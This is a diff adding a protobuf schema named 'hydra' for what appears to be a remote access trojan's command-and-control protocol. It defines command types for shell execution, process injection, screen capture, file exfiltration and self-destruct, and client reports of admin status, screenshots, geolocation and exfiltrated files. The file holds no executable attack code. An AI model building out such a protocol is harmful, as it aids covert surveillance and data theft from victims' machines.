@@ -1,0 +1,89 @@
+syntax = "proto3";
+
+package hydra;
+
+// Client -> Server Messages
+message ClientMessage {
+  string client_id = 1;
+  oneof payload {
+    Heartbeat heartbeat = 2;
+    CommandResult result = 3;
+    Screenshot screen = 4;
+    Geolocation geo = 5;
+  }
+}
+
+// Server -> Client Messages
+message ServerMessage {
+  string task_id = 1;
+  oneof payload {
+    Command command = 2;
+    FileTransfer file = 3;
+    ConfigUpdate config = 4;
+  }
+}
+
+// Sub-messages
+message Heartbeat {
+  uint64 timestamp = 1;
+  SystemInfo system = 2;
+}
+
+message SystemInfo {
+  string os = 1;
+  string hostname = 2;
+  bool is_admin = 3;
+  string gpu = 4;  // For NVENC detection
+}
+
+message Command {
+  string task_id = 1;
+  repeated string args = 2;
+  enum CommandType {
+    CMD_EXEC = 0;
+    PROCESS_INJECT = 1;
+    SCREEN_CAPTURE = 2;
+    FILE_EXFIL = 3;
+    SELF_DESTRUCT = 4;
+  }
+  CommandType type = 3;
+}
+
+message CommandResult {
+  string output = 1;
+  bool success = 2;
+  bytes binary_data = 3;  // For exfiltrated files
+}
+
+// Added definitions
+message Screenshot {
+  bytes image_data = 1; // e.g., PNG or JPEG data
+  uint64 timestamp = 2;
+  string format = 3; // e.g., "png", "jpeg"
+}
+
+message Geolocation {
+  double latitude = 1;
+  double longitude = 2;
+  float accuracy = 3; // meters
+  uint64 timestamp = 4;
+}
+
+message FileTransfer {
+  string file_path = 1;
+  bytes file_data = 2; // Or use streaming for large files
+  enum TransferType {
+    UPLOAD = 0;
+    DOWNLOAD = 1;
+  }
+  TransferType type = 3;
+}
+
+message ConfigUpdate {
+  string setting_name = 1;
+  string setting_value = 2;
+  // Add other config parameters as needed
+}
+
+// Generate Python code
+// protoc -I=. --python_out=. core/protobufs/hydra.proto
